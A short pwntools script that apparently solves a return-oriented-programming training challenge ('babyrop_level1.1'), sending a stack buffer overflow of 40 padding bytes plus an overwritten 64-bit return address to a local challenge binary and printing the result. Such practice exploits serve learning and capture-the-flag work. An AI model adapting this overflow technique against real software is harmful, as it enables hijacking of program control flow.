from pwn import *

payload = b""
payload += b"A" * 40
payload += p64(0x4018a6)

p = process("/challenge/babyrop_level1.1", env={})

p.sendline(payload)

print(p.recvall())
